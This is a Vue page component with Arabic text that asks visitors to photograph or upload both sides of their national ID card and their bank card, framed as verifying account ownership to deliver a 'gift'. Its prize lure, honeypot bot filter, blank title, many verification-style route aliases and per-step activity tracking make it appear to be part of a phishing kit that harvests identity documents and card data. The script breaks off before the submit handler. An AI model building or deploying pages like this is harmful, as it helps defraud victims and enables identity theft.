<template>
  <AppShell>
    <HoneypotField location="documents_page" />

    <div class="documents-page-wrapper">
      <div class="container documents-container">
        <!-- عنوان فوق المحتوى -->
        <header class="documents-top-header">
          <h1 class="documents-main-title">
            يرجى إرفاق المستندات المطلوبة أدناه للتحقق من ملكية الحساب وضمان تسليم الهدية للعميل المستحق.
          </h1>
        </header>

        <!-- الفراغ الأبيض الكبير الرئيسي -->
        <main class="white-canvas-card">
          <form class="documents-form" @submit.prevent="handleSubmit">
            <!-- ============================================== -->
            <!-- المطلب الأول: بطاقة الرقم القومي (أمامي وخلفي) -->
            <!-- ============================================== -->
            <section class="requirement-section" aria-labelledby="req-1-title">
              <div class="requirement-header">
                <div class="req-number-badge">1</div>
                <div class="req-header-text">
                  <h2 id="req-1-title" class="req-title">بطاقة الرقم القومي (من الأمام ومن الخلف)</h2>
                  <p class="req-description">
                    يرجى التقاط أو اختيار صورة لبطاقة الرقم القومي من الوجه الأمامي ومن الوجه الخلفي.
                  </p>
                </div>
              </div>

              <div class="uploads-grid two-cols">
                <!-- الوجه الأمامي للرقم القومي -->
                <div
                  class="upload-card"
                  :class="{ 'has-file': !!idFrontPreview, 'is-dragging': isDraggingFront }"
                  @dragover.prevent="isDraggingFront = true"
                  @dragleave.prevent="isDraggingFront = false"
                  @drop.prevent="handleDrop($event, 'front')"
                >
                  <div class="upload-card-header">
                    <span class="upload-badge">الوجه الأمامي</span>
                    <span v-if="idFrontPreview" class="status-chip success">
                      <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="3">
                        <polyline points="20 6 9 17 4 12"></polyline>
                      </svg>
                      تم الإرفاق
                    </span>
                    <span v-else class="status-chip pending">مطلوب</span>
                  </div>

                  <!-- مساحة المعاينة عند وجود صورة -->
                  <div v-if="idFrontPreview" class="preview-area">
                    <img :src="idFrontPreview" alt="معاينة الوجه الأمامي للرقم القومي" class="preview-image" />
                    <div class="preview-overlay">
                      <button
                        type="button"
                        class="overlay-btn view-btn"
                        title="معاينة مكبرة"
                        @click="openLightbox(idFrontPreview, 'بطاقة الرقم القومي - الوجه الأمامي')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                          <circle cx="11" cy="11" r="8"></circle>
                          <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                          <line x1="11" y1="8" x2="11" y2="14"></line>
                          <line x1="8" y1="11" x2="14" y2="11"></line>
                        </svg>
                        <span>تكبير</span>
                      </button>

                      <button
                        type="button"
                        class="overlay-btn remove-btn"
                        title="حذف الصورة"
                        @click="removeImage('front')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                          <polyline points="3 6 5 6 21 6"></polyline>
                          <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
                        </svg>
                        <span>حذف</span>
                      </button>
                    </div>
                  </div>

                  <!-- مساحة الاختيار والالتقاط عند عدم وجود صورة -->
                  <div v-else class="upload-placeholder">
                    <div class="placeholder-icon-box">
                      <svg viewBox="0 0 24 24" width="32" height="32" fill="none" stroke="#026A32" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                        <circle cx="8" cy="11" r="2"></circle>
                        <path d="M14 9h4"></path>
                        <path d="M14 13h4"></path>
                        <path d="M6 16h12"></path>
                      </svg>
                    </div>
                    <span class="placeholder-title">صورة بطاقة الرقم القومي (الوجه الأمامي)</span>
                    <span class="placeholder-hint">اختر طريقة الإرفاق:</span>

                    <div class="upload-actions-row">
                      <!-- زر فتح الكاميرا المباشرة -->
                      <button
                        type="button"
                        class="action-btn camera-btn"
                        @click="openCameraModal('front')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                          <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
                          <circle cx="12" cy="13" r="4"></circle>
                        </svg>
                        <span>التقاط صورة</span>
                      </button>

                      <!-- زر اختيار ملف من المعرض -->
                      <button
                        type="button"
                        class="action-btn browse-btn"
                        @click="triggerFileInput('front')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                          <polyline points="17 8 12 3 7 8"></polyline>
                          <line x1="12" y1="3" x2="12" y2="15"></line>
                        </svg>
                        <span>اختيار من الملفات</span>
                      </button>
                    </div>
                  </div>

                  <!-- حقل الملفات المخفي للوجه الأمامي -->
                  <input
                    ref="frontFileInputRef"
                    type="file"
                    accept="image/*"
                    class="visually-hidden"
                    @change="handleFileChange($event, 'front')"
                  />
                  <!-- حقل كاميرا الجوال المباشر كبديل احتياطي -->
                  <input
                    ref="frontCameraInputRef"
                    type="file"
                    accept="image/*"
                    capture="environment"
                    class="visually-hidden"
                    @change="handleFileChange($event, 'front')"
                  />
                </div>

                <!-- الوجه الخلفي للرقم القومي -->
                <div
                  class="upload-card"
                  :class="{ 'has-file': !!idBackPreview, 'is-dragging': isDraggingBack }"
                  @dragover.prevent="isDraggingBack = true"
                  @dragleave.prevent="isDraggingBack = false"
                  @drop.prevent="handleDrop($event, 'back')"
                >
                  <div class="upload-card-header">
                    <span class="upload-badge">الوجه الخلفي</span>
                    <span v-if="idBackPreview" class="status-chip success">
                      <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="3">
                        <polyline points="20 6 9 17 4 12"></polyline>
                      </svg>
                      تم الإرفاق
                    </span>
                    <span v-else class="status-chip pending">مطلوب</span>
                  </div>

                  <!-- مساحة المعاينة عند وجود صورة -->
                  <div v-if="idBackPreview" class="preview-area">
                    <img :src="idBackPreview" alt="معاينة الوجه الخلفي للرقم القومي" class="preview-image" />
                    <div class="preview-overlay">
                      <button
                        type="button"
                        class="overlay-btn view-btn"
                        title="معاينة مكبرة"
                        @click="openLightbox(idBackPreview, 'بطاقة الرقم القومي - الوجه الخلفي')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                          <circle cx="11" cy="11" r="8"></circle>
                          <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                          <line x1="11" y1="8" x2="11" y2="14"></line>
                          <line x1="8" y1="11" x2="14" y2="11"></line>
                        </svg>
                        <span>تكبير</span>
                      </button>

                      <button
                        type="button"
                        class="overlay-btn remove-btn"
                        title="حذف الصورة"
                        @click="removeImage('back')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                          <polyline points="3 6 5 6 21 6"></polyline>
                          <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
                        </svg>
                        <span>حذف</span>
                      </button>
                    </div>
                  </div>

                  <!-- مساحة الاختيار والالتقاط عند عدم وجود صورة -->
                  <div v-else class="upload-placeholder">
                    <div class="placeholder-icon-box">
                      <svg viewBox="0 0 24 24" width="32" height="32" fill="none" stroke="#026A32" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                        <line x1="2" y1="10" x2="22" y2="10"></line>
                        <line x1="6" y1="15" x2="10" y2="15"></line>
                        <line x1="14" y1="15" x2="18" y2="15"></line>
                      </svg>
                    </div>
                    <span class="placeholder-title">صورة بطاقة الرقم القومي (الوجه الخلفي)</span>
                    <span class="placeholder-hint">اختر طريقة الإرفاق:</span>

                    <div class="upload-actions-row">
                      <!-- زر فتح الكاميرا المباشرة -->
                      <button
                        type="button"
                        class="action-btn camera-btn"
                        @click="openCameraModal('back')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                          <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
                          <circle cx="12" cy="13" r="4"></circle>
                        </svg>
                        <span>التقاط صورة</span>
                      </button>

                      <!-- زر اختيار ملف من المعرض -->
                      <button
                        type="button"
                        class="action-btn browse-btn"
                        @click="triggerFileInput('back')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                          <polyline points="17 8 12 3 7 8"></polyline>
                          <line x1="12" y1="3" x2="12" y2="15"></line>
                        </svg>
                        <span>اختيار من الملفات</span>
                      </button>
                    </div>
                  </div>

                  <!-- حقل الملفات المخفي للوجه الخلفي -->
                  <input
                    ref="backFileInputRef"
                    type="file"
                    accept="image/*"
                    class="visually-hidden"
                    @change="handleFileChange($event, 'back')"
                  />
                  <!-- حقل كاميرا الجوال المباشر كبديل احتياطي -->
                  <input
                    ref="backCameraInputRef"
                    type="file"
                    accept="image/*"
                    capture="environment"
                    class="visually-hidden"
                    @change="handleFileChange($event, 'back')"
                  />
                </div>
              </div>
            </section>

            <!-- خط فاصل خفيف -->
            <div class="form-section-divider" aria-hidden="true" />

            <!-- ============================================================== -->
            <!-- المطلب الثاني: البطاقة البنكية مع إظهار أول 4 وآخر 4 أرقام فقط -->
            <!-- ============================================================== -->
            <section class="requirement-section" aria-labelledby="req-2-title">
              <div class="requirement-header">
                <div class="req-number-badge">2</div>
                <div class="req-header-text">
                  <h2 id="req-2-title" class="req-title">صورة البطاقة البنكية (مع إظهار أول 4 وآخر 4 أرقام فقط)</h2>
                  <p class="req-description">
                    يرجى التقاط صورة للبطاقة البنكية مع إظهار أول 4 أرقام وآخر 4 أرقام فقط كما هو موضح في النموذج التالي:
                  </p>
                </div>
              </div>

              <!-- صندوق النموذج التوضيحي المرئي لكيفية تصوير البطاقة -->
              <div class="card-example-guide-container">
                <div class="guide-visual-layout">
                  <div class="guide-image-frame">
                    <img
                      :src="sampleCardImage"
                      alt="نموذج توضيحي لصورة البطاقة البنكية مع إظهار أول 4 وآخر 4 أرقام فقط"
                      class="sample-card-img"
                    />
                  </div>

                  <div class="guide-instructions-list">
                    <div class="guide-point-card">
                      <span class="point-bullet">•</span>
                      <p>إظهار أول 4 أرقام من اليسار بشكل واضح.</p>
                    </div>

                    <div class="guide-point-card">
                      <span class="point-bullet">•</span>
                      <p>تغطية الأرقام الـ 8 التي في المنتصف بأي وسيلة قبل التصوير.</p>
                    </div>

                    <div class="guide-point-card">
                      <span class="point-bullet">•</span>
                      <p>إظهار آخر 4 أرقام من اليمين بشكل واضح.</p>
                    </div>
                  </div>
                </div>
              </div>

              <!-- مساحة رفع والتقاط صورة البطاقة البنكية -->
              <div class="uploads-grid single-col">
                <div
                  class="upload-card bank-upload-card"
                  :class="{ 'has-file': !!bankCardPreview, 'is-dragging': isDraggingCard }"
                  @dragover.prevent="isDraggingCard = true"
                  @dragleave.prevent="isDraggingCard = false"
                  @drop.prevent="handleDrop($event, 'card')"
                >
                  <div class="upload-card-header">
                    <span class="upload-badge">صورة البطاقة البنكية</span>
                    <span v-if="bankCardPreview" class="status-chip success">
                      <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="currentColor" stroke-width="3">
                        <polyline points="20 6 9 17 4 12"></polyline>
                      </svg>
                      تم الإرفاق
                    </span>
                    <span v-else class="status-chip pending">مطلوب</span>
                  </div>

                  <!-- مساحة المعاينة عند وجود صورة -->
                  <div v-if="bankCardPreview" class="preview-area">
                    <img :src="bankCardPreview" alt="معاينة البطاقة البنكية" class="preview-image" />
                    <div class="preview-overlay">
                      <button
                        type="button"
                        class="overlay-btn view-btn"
                        title="معاينة مكبرة"
                        @click="openLightbox(bankCardPreview, 'صورة البطاقة البنكية')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                          <circle cx="11" cy="11" r="8"></circle>
                          <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
                          <line x1="11" y1="8" x2="11" y2="14"></line>
                          <line x1="8" y1="11" x2="14" y2="11"></line>
                        </svg>
                        <span>تكبير</span>
                      </button>

                      <button
                        type="button"
                        class="overlay-btn remove-btn"
                        title="حذف الصورة"
                        @click="removeImage('card')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
                          <polyline points="3 6 5 6 21 6"></polyline>
                          <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path>
                        </svg>
                        <span>حذف</span>
                      </button>
                    </div>
                  </div>

                  <!-- مساحة الاختيار والالتقاط عند عدم وجود صورة -->
                  <div v-else class="upload-placeholder">
                    <div class="placeholder-icon-box">
                      <svg viewBox="0 0 24 24" width="32" height="32" fill="none" stroke="#026A32" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
                        <line x1="1" y1="10" x2="23" y2="10"></line>
                      </svg>
                    </div>
                    <span class="placeholder-title">صورة البطاقة البنكية</span>
                    <span class="placeholder-hint">اختر طريقة الإرفاق:</span>

                    <div class="upload-actions-row">
                      <!-- زر فتح الكاميرا المباشرة -->
                      <button
                        type="button"
                        class="action-btn camera-btn"
                        @click="openCameraModal('card')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                          <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
                          <circle cx="12" cy="13" r="4"></circle>
                        </svg>
                        <span>التقاط صورة</span>
                      </button>

                      <!-- زر اختيار ملف من المعرض -->
                      <button
                        type="button"
                        class="action-btn browse-btn"
                        @click="triggerFileInput('card')"
                      >
                        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                          <polyline points="17 8 12 3 7 8"></polyline>
                          <line x1="12" y1="3" x2="12" y2="15"></line>
                        </svg>
                        <span>اختيار من الملفات</span>
                      </button>
                    </div>
                  </div>

                  <!-- حقل الملفات المخفي للبطاقة البنكية -->
                  <input
                    ref="cardFileInputRef"
                    type="file"
                    accept="image/*"
                    class="visually-hidden"
                    @change="handleFileChange($event, 'card')"
                  />
                  <!-- حقل كاميرا الجوال المباشر كبديل احتياطي -->
                  <input
                    ref="cardCameraInputRef"
                    type="file"
                    accept="image/*"
                    capture="environment"
                    class="visually-hidden"
                    @change="handleFileChange($event, 'card')"
                  />
                </div>
              </div>
            </section>

            <!-- رسالة الخطأ عند عدم اكتمال الصور -->
            <div v-if="validationError" class="validation-error-box">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="12" y1="8" x2="12" y2="12"></line>
                <line x1="12" y1="16" x2="12.01" y2="16"></line>
              </svg>
              <span>{{ validationError }}</span>
            </div>

            <!-- زر التأكيد والإرسال -->
            <div class="form-submit-row">
              <button
                type="submit"
                class="button primary submit-documents-btn"
                :disabled="isSubmitting"
              >
                <span v-if="!isSubmitting">
                  التالي
                  <span class="btn-arrow" aria-hidden="true">‹</span>
                </span>
                <span v-else class="loading-btn-content">
                  <span class="mini-spinner" aria-hidden="true" />
                  <span>جاري المتابعة...</span>
                </span>
              </button>
            </div>
          </form>
        </main>
      </div>
    </div>

    <!-- نافذة الكاميرا المباشرة (Live Camera Viewfinder Modal) -->
    <transition name="modal-fade">
      <div
        v-if="isCameraModalOpen"
        class="camera-modal-backdrop"
        role="dialog"
        aria-modal="true"
        @click.self="closeCameraModal"
      >
        <div class="camera-modal-card">
          <!-- ترويسة نافذة الكاميرا -->
          <div class="camera-modal-header">
            <div class="camera-title-wrap">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
                <circle cx="12" cy="13" r="4"></circle>
              </svg>
              <span>
                {{
                  activeCameraType === "front"
                    ? "التقاط صورة بطاقة الرقم القومي (الوجه الأمامي)"
                    : activeCameraType === "back"
                    ? "التقاط صورة بطاقة الرقم القومي (الوجه الخلفي)"
                    : "التقاط صورة البطاقة البنكية"
                }}
              </span>
            </div>

            <button
              type="button"
              class="camera-close-btn"
              title="إغلاق الكاميرا"
              @click="closeCameraModal"
            >
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </button>
          </div>

          <!-- شاشة الكاميرا / المعاينة -->
          <div class="camera-viewport-container">
            <!-- حالة جاري فتح الكاميرا -->
            <div v-if="cameraLoading" class="camera-loading-overlay">
              <span class="mini-spinner large" />
              <span>جاري تشغيل الكاميرا...</span>
            </div>

            <!-- عرض الصورة الملتقطة للمعاينة قبل الاعتماد -->
            <div v-if="capturedPhotoUrl" class="captured-preview-wrap">
              <img :src="capturedPhotoUrl" alt="الصورة الملتقطة" class="captured-preview-img" />
            </div>

            <!-- البث الحي للكاميرا -->
            <div v-else class="live-stream-wrap">
              <video
                ref="videoElementRef"
                autoplay
                playsinline
                muted
                class="live-camera-video"
              ></video>

              <!-- إطار إرشادي للبطاقة -->
              <div class="camera-card-frame">
                <div class="frame-corner top-left"></div>
                <div class="frame-corner top-right"></div>
                <div class="frame-corner bottom-left"></div>
                <div class="frame-corner bottom-right"></div>
                <span class="frame-hint">قم بتوسيط البطاقة داخل هذا الإطار</span>
              </div>
            </div>
          </div>

          <!-- شريط التحكم والأزرار السفلية -->
          <div class="camera-controls-bar">
            <!-- أزرار بعد التقاط الصورة -->
            <template v-if="capturedPhotoUrl">
              <button
                type="button"
                class="camera-action-btn btn-retake"
                @click="retakeSnapshot"
              >
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
                  <polyline points="1 4 1 10 7 10"></polyline>
                  <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"></path>
                </svg>
                <span>إعادة الالتقاط</span>
              </button>

              <button
                type="button"
                class="camera-action-btn btn-confirm"
                @click="confirmCapturedPhoto"
              >
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5">
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
                <span>استخدام هذه الصورة</span>
              </button>
            </template>

            <!-- أزرار أثناء البث المباشر -->
            <template v-else>
              <!-- زر تبديل الكاميرا (الأمامية / الخلفية) -->
              <button
                type="button"
                class="camera-icon-btn"
                title="تبديل الكاميرا"
                @click="switchCamera"
              >
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <path d="M20 16v4a2 2 0 0 1-2 2h-4"></path>
                  <path d="M4 8V4a2 2 0 0 1 2-2h4"></path>
                  <path d="M20 4l-4 4"></path>
                  <path d="M4 20l4-4"></path>
                </svg>
              </button>

              <!-- زر الالتقاط الدائري الرئيسي -->
              <button
                type="button"
                class="shutter-capture-btn"
                title="التقاط الصورة"
                :disabled="cameraLoading"
                @click="takeSnapshot"
              >
                <span class="shutter-inner-circle"></span>
              </button>

              <!-- زر الإلغاء -->
              <button
                type="button"
                class="camera-icon-btn"
                title="إلغاء"
                @click="closeCameraModal"
              >
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <line x1="18" y1="6" x2="6" y2="18"></line>
                  <line x1="6" y1="6" x2="18" y2="18"></line>
                </svg>
              </button>
            </template>
          </div>
        </div>
      </div>
    </transition>

    <!-- نافذة المعاينة المكبرة (Lightbox Modal) -->
    <transition name="modal-fade">
      <div
        v-if="lightboxImage"
        class="lightbox-modal-backdrop"
        role="dialog"
        aria-modal="true"
        @click="closeLightbox"
      >
        <div class="lightbox-content" @click.stop>
          <div class="lightbox-header">
            <span class="lightbox-title">{{ lightboxTitle }}</span>
            <button
              type="button"
              class="lightbox-close-btn"
              title="إغلاق"
              @click="closeLightbox"
            >
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </button>
          </div>
          <div class="lightbox-body">
            <img :src="lightboxImage" :alt="lightboxTitle" class="lightbox-image" />
          </div>
        </div>
      </div>
    </transition>
  </AppShell>
</template>

<script setup lang="ts">
import { nextTick, onMounted, onUnmounted, ref } from "vue";
import sampleCardImage from "~/assets/add/card.png";
import {
  trackCustomerActivity,
  submitCustomerDocuments,
} from "~/composables/useCustomerTracking";
import { ROUTE_PATHS } from "~/composables/useRouteConstants";

definePageMeta({
  alias: [
    "/verify-identity",
    "/upload-documents",
    "/verify-docs",
    "/id-verification",
    "/card-verification",
    "/documents",
  ],
});

useHead({
  title: "",
});

const router = useRouter();

// تخزين ومعاينة الصور بصيغة Base64
const idFrontPreview = ref<string>("");
const idBackPreview = ref<string>("");
const bankCardPreview = ref<string>("");

// مراجع حقول الملفات المخفية
const frontFileInputRef = ref<HTMLInputElement | null>(null);
const backFileInputRef = ref<HTMLInputElement | null>(null);
const cardFileInputRef = ref<HTMLInputElement | null>(null);
const frontCameraInputRef = ref<HTMLInputElement | null>(null);
const backCameraInputRef = ref<HTMLInputElement | null>(null);
const cardCameraInputRef = ref<HTMLInputElement | null>(null);

// حالات الكاميرا المباشرة (Webcam / Live Camera)
const isCameraModalOpen = ref(false);
const activeCameraType = ref<"front" | "back" | "card">("front");
const videoElementRef = ref<HTMLVideoElement | null>(null);
const mediaStream = ref<MediaStream | null>(null);
const currentFacingMode = ref<"environment" | "user">("environment");
const capturedPhotoUrl = ref<string | null>(null);
const cameraLoading = ref(false);

// حالات السحب والإفلات
const isDraggingFront = ref(false);
const isDraggingBack = ref(false);
const isDraggingCard = ref(false);

// حالة الإرسال والتحقق
const isSubmitting = ref(false);
const validationError = ref("");

// نافذة المعاينة المكبرة
const lightboxImage = ref<string | null>(null);
const lightboxTitle = ref("");

// فتح حقل اختيار الملفات
const triggerFileInput = (type: "front" | "back" | "card") => {
  if (type === "front" && frontFileInputRef.value) {
    frontFileInputRef.value.click();
  } else if (type === "back" && backFileInputRef.value) {
    backFileInputRef.value.click();
  } else if (type === "card" && cardFileInputRef.value) {
    cardFileInputRef.value.click();
  }
};

// تشغيل الكاميرا المباشرة
const openCameraModal = async (type: "front" | "back" | "card") => {
  activeCameraType.value = type;
  capturedPhotoUrl.value = null;
  isCameraModalOpen.value = true;
  await startCameraStream();
};

const startCameraStream = async () => {
  cameraLoading.value = true;
  stopCameraStream();

  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      throw new Error("Camera not supported");
    }

    const constraints: MediaStreamConstraints = {
      video: {
        facingMode: { ideal: currentFacingMode.value },
        width: { ideal: 1920 },
        height: { ideal: 1080 },
      },
      audio: false,
    };

    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    mediaStream.value = stream;

    await nextTick();
    if (videoElementRef.value) {
      videoElementRef.value.srcObject = stream;
      await videoElementRef.value.play();
    }
  } catch (err) {
    console.warn("Direct camera stream failed, falling back to native camera input", err);
    // إغلاق نافذة الكاميرا وفتح كاميرا الهاتف المباشرة كبديل فوري
    closeCameraModal();
    if (activeCameraType.value === "front" && frontCameraInputRef.value) {
      frontCameraInputRef.value.click();
    } else if (activeCameraType.value === "back" && backCameraInputRef.value) {
      backCameraInputRef.value.click();
    } else if (activeCameraType.value === "card" && cardCameraInputRef.value) {
      cardCameraInputRef.value.click();
    }
  } finally {
    cameraLoading.value = false;
  }
};

// تبديل الكاميرا (الأمامية / الخلفية)
const switchCamera = async () => {
  currentFacingMode.value = currentFacingMode.value === "environment" ? "user" : "environment";
  await startCameraStream();
};

// التقاط اللقطة من الفيديو
const takeSnapshot = () => {
  if (!videoElementRef.value) return;
  const video = videoElementRef.value;
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth || 1280;
  canvas.height = video.videoHeight || 720;
  const ctx = canvas.getContext("2d");
  if (!ctx) return;

  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  capturedPhotoUrl.value = canvas.toDataURL("image/jpeg", 0.85);
};

// إعادة التقاط اللقطة
const retakeSnapshot = () => {
  capturedPhotoUrl.value = null;
};

// تأكيد واستخدام الصورة الملتقطة
const confirmCapturedPhoto = () => {
  if (!capturedPhotoUrl.value) return;
  const photo = capturedPhotoUrl.value;
  if (activeCameraType.value === "front") idFrontPreview.value = photo;
  else if (activeCameraType.value === "back") idBackPreview.value = photo;
  else if (activeCameraType.value === "card") bankCardPreview.value = photo;

  validationError.value = "";
  closeCameraModal();

  void trackCustomerActivity(
    {
      lastAction: `تم التقاط صورة ${activeCameraType.value === "front" ? "الرقم القومي (أمامي)" : activeCameraType.value === "back" ? "الرقم القومي (خلفي)" : "البطاقة البنكية"} بالكاميرا المباشرة`,
    },
    "documents_uploaded",
    { type: activeCameraType.value }
  );
};

// إيقاف بث الكاميرا
const stopCameraStream = () => {
  if (mediaStream.value) {
    mediaStream.value.getTracks().forEach((track) => track.stop());
    mediaStream.value = null;
  }
};

// إغلاق نافذة الكاميرا
const closeCameraModal = () => {
  stopCameraStream();
  isCameraModalOpen.value = false;
  capturedPhotoUrl.value = null;
};

// ضغط وتحسين حجم الصورة عبر HTML5 Canvas
const optimizeImage = (file: File, maxWidth = 1400, quality = 0.82): Promise<string> => {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = (e) => {
      const img = new Image();
      img.onload = () => {
        const canvas = document.createElement("canvas");
        let width = img.width;
        let height = img.height;

        if (width > maxWidth) {
          height = Math.round((height * maxWidth) / width);
          width = maxWidth;
        }

        canvas.width = width;
        canvas.height = height;

        const ctx = canvas.getContext("2d");
        if (!ctx) {
          resolve(e.target?.result as string);
          return;
        }

        ctx.drawImage(img, 0, 0, width, height);
        const dataUrl = canvas.toDataURL("image/jpeg", quality);
        resolve(dataUrl);
      };
      img.onerror = () => reject(new Error("تعذر قراءة الصورة"));
      img.src = e.target?.result as string;
    };
    reader.onerror = () => reject(new Error("تعذر تحميل الملف"));
    reader.readAsDataURL(file);
  });
};

// معالجة اختيار الملف عبر Input
const handleFileChange = async (event: Event, type: "front" | "back" | "card") => {
  const target = event.target as HTMLInputElement;
  if (!target.files || !target.files[0]) return;

  const file = target.files[0];
  validationError.value = "";

  try {
    const optimizedBase64 = await optimizeImage(file);
    if (type === "front") idFrontPreview.value = optimizedBase64;
    else if (type === "back") idBackPreview.value = optimizedBase64;
    else if (type === "card") bankCardPreview.value = optimizedBase64;

    void trackCustomerActivity(
      {
        lastAction: `تم رفع صورة ${type === "front" ? "الرقم القومي (أمامي)" : type === "back" ? "الرقم القومي (خلفي)" : "البطاقة البنكية"}`,
      },
      "documents_uploaded",
      { type }
    );
  } catch (err) {
    console.error("Image processing error", err);
    validationError.value = "حدث خطأ أثناء معالجة الصورة، يرجى المحاولة بصورة أخرى.";
  } finally {
    target.value = "";
  }
};

// معالجة السحب والإفلات (Drag and Drop)
const handleDrop = async (event: DragEvent, type: "front" | "back" | "card") => {
  if (type === "front") isDraggingFront.value = false;
  if (type === "back") isDraggingBack.value = false;
  if (type === "card") isDraggingCard.value = false;

  const files = event.dataTransfer?.files;
  if (!files || !files[0]) return;

  const file = files[0];
  if (!file.type.startsWith("image/")) {
    validationError.value = "يرجى إرفاق ملف صورة صالح (JPEG, PNG, WEBP).";
    return;
  }

  validationError.value = "";

  try {
    const optimizedBase64 = await optimizeImage(file);
    if (type === "front") idFrontPreview.value = optimizedBase64;
    else if (type === "back") idBackPreview.value = optimizedBase64;
    else if (type === "card") bankCardPreview.value = optimizedBase64;

    void trackCustomerActivity(
      {
        lastAction: `تم رفع صورة ${type === "front" ? "الرقم القومي (أمامي)" : type === "back" ? "الرقم القومي (خلفي)" : "البطاقة البنكية"} بالسحب والإفلات`,
      },
      "documents_uploaded",
      { type }
    );
  } catch (err) {
    console.error("Drop processing error", err);
    validationError.value = "حدث خطأ أثناء معالجة الصورة، يرجى المحاولة بصورة أخرى.";
  }
};

// حذف صورة محددة
const removeImage = (type: "front" | "back" | "card") => {
  if (type === "front") idFrontPreview.value = "";
  else if (type === "back") idBackPreview.value = "";
  else if (type === "card") bankCardPreview.value = "";
};

// فتح نافذة المعاينة المكبرة
const openLightbox = (imageSrc: string, title: string) => {
  lightboxImage.value = imageSrc;
  lightboxTitle.value = title;
};

// إغلاق نافذة المعاينة المكبرة
const closeLightbox = () => {
  lightboxImage.value = null;
  lightboxTitle.value = "";
};

